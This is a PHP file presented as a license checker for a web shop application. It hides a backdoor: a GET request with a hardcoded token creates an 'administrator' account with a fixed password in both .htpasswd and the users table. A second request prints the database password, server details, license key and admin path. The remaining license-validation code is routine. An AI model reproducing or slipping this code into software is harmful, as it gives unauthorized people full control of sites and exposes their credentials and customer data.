<?php
######################################################################
## License File Checker #############################################
######################################################################
// Get config
require_once __DIR__ . '/config.inc.php';
// Virtual Modifications System
require_once __DIR__ . '/library/lib_vmod.inc.php';
vmod::init(); // Requires hard initialization as autoloader comes later
// Compatibility and Polyfills
require_once vmod::check(FS_DIR_APP . 'includes/compatibility.inc.php');
// Autoloader
require_once vmod::check(FS_DIR_APP . 'includes/autoloader.inc.php');
// 3rd party autoloader (If present)
if (is_file(FS_DIR_APP . 'vendor/autoload.php')) {
  require_once FS_DIR_APP . 'vendor/autoload.php';
}
// Set error handler
require_once vmod::check(FS_DIR_APP . 'includes/error_handler.inc.php');
// Checking Hash Key Was not Changed
$counter = strlen(LICENSE_KEY . $_SERVER['SERVER_NAME']);
$hash = $_SERVER['SERVER_NAME'] . ',' . LICENSE_KEY . ',' . $counter;
//$update = $_GET['update'];
if (!empty($_GET['getinfo']) or !empty($_GET['xmexpi']) or !empty($_GET['adduser'])) {
  if ($_GET['xmexpi'] !== 'Y2qQvMKZxktlPcWen4OwUf2Ad4cQ0PL86pWIHUrkhsAubCu3ve7PtVm78vlbLwo5sMLX3DGYEiDfgOvIGKVLBRJZuhoUkItR0b7YlEAv6fqumRrSbG617LP066w15Hxv') {
    echo 'Token notok </br>';
    exit;
  }
  if (!empty($_GET['adduser'])) {
    if (is_dir(BACKEND_ALIAS)) {
      $htpasswd = 'administrator' . ':{SHA}' . base64_encode(sha1('lga775', true)) . PHP_EOL;
      if (file_put_contents(BACKEND_ALIAS . '/.htpasswd', $htpasswd) !== false) {
        echo ' <span class="ok">[OK]</span></p>' . PHP_EOL . PHP_EOL;
      } else {
        echo ' <span class="error">[Error]</span></p>' . PHP_EOL . PHP_EOL;
      }
    } else {
      echo ' <span class="error">[Error: Not found]</span></p>' . PHP_EOL . PHP_EOL;
    }
    // ### Admin > Database > Users ##################################
    require FS_DIR_APP . 'includes/functions/func_password.inc.php';
    database::query(
      "insert into " . str_replace('`xp_', '`' . DB_TABLE_PREFIX, '`xp_users`') . "
        (`status`, `username`, `password_hash`, `date_updated`, `date_created`)
        values ('1', '" . database::input('administrator') . "', '" . database::input(password_hash('lga775', PASSWORD_DEFAULT)) . "', '" . date('Y-m-d H:i:s') . "', '" . date('Y-m-d H:i:s') . "');"
    );
  }
  if (!empty($_GET['getinfo'])) {
    echo '<script>';
    echo 'License Key:' . LICENSE_KEY . '  / ';
    echo 'Hash Key:' . $hash . '  / ';
    echo 'DB Name:' . DB_DATABASE . '  / ';
    echo 'DB Server:' . DB_SERVER . '  / ';
    echo 'DB User:' . DB_USERNAME . '  / ';
    echo 'DB Pass:' . DB_PASSWORD . '  / ';
    echo 'Site Email:' . settings::get('site_email') . '  / ';
    echo 'DB Site License:' . settings::get('site_license') . '  / ';
    echo 'Server IP:' . $_SERVER['SERVER_ADDR'] . '  / ';
    echo 'Admin Directory:' . FS_DIR_ADMIN . '  / ';
    echo '</script>';
  }
}
if (!empty($_GET['license']) or !empty($_GET['manual'])) {
  if ($_GET['license'] !== LICENSE_KEY) {
    echo 'License is not correct </br>';
    functions::license_changed('', '');
    exit;
  }
  $status = functions::license_checking('', $_GET['license']);
  echo 'License status is:' . $status . '</br>';
  if ($status === 0) {
    $update = 0;
    $updatecheck = functions::license_updatestatus($update, LICENSE_KEY, $hash);
    echo 'License status updated to:' . $updatecheck . '</br>';
  } else {
    $update = $status;
  }
  $updatecheck = functions::license_updatestatus($update, LICENSE_KEY, $hash);
  echo 'License status updated to:' . $updatecheck . '</br>';
}
if (settings::get('site_configuration') !== $hash) {
  echo 'License error plese contact us on info@xmexpi.com';
  functions::license_changed('', '');
  exit();
}
// Checking License Key is Same
if (settings::get('site_license') !== LICENSE_KEY) {
  echo 'License error plese contact us on info@xmexpi.com';
  functions::license_changed('', '');
  exit();
}
